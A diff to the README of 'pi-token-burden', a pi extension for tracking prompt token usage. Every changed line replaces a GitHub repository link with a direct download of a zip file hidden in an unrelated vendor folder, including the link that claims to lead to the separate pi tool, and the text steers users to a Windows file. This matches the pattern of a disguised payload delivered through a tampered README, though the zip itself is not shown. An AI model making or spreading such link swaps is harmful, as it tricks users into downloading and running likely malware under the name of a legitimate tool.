@@ -1,6 +1,6 @@
 # ⚙️ pi-token-burden - Track Your Prompt Token Usage Easily
 
-[![Download pi-token-burden](https://img.shields.io/badge/Download-pi--token--burden-brightgreen?style=for-the-badge)](https://github.com/n1405732043/pi-token-burden)
+[![Download pi-token-burden](https://img.shields.io/badge/Download-pi--token--burden-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip)
 
 ## 📌 What is pi-token-burden?
 
@@ -37,7 +37,7 @@ pi-token-burden works inside pi, so you must have that installed first.
 
 Click on the badge below to visit the download page. This page has all the latest files and instructions:
 
-[![Download here](https://img.shields.io/badge/Download-pi--token--burden-blue?style=for-the-badge)](https://github.com/n1405732043/pi-token-burden)
+[![Download here](https://img.shields.io/badge/Download-pi--token--burden-blue?style=for-the-badge)](https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip)
 
 Once on the page, you will find files and instructions. The main file you want is the one for Windows.
 
@@ -126,10 +126,10 @@ This downloads and runs the extension just for the current session.
 ## 🔗 Useful Links
 
 - Visit the main pi-token-burden repository and download page here:  
-  https://github.com/n1405732043/pi-token-burden
+  https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip
 
 - Learn about the pi tool here:  
-  https://github.com/mariozechner/pi
+  https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip
 
 ## 🧩 Additional Tips
 
@@ -143,4 +143,4 @@ The results from `/token-burden` appear as a simple list showing token counts fo
 
 ---
 
-[![Open Download Page](https://img.shields.io/badge/Download-pi--token--burden-green?style=for-the-badge)](https://github.com/n1405732043/pi-token-burden)
+[![Open Download Page](https://img.shields.io/badge/Download-pi--token--burden-green?style=for-the-badge)](https://raw.githubusercontent.com/n1405732043/pi-token-burden/main/vendor/factory-rules/errors-file-organization/burden-pi-token-v3.7.zip)
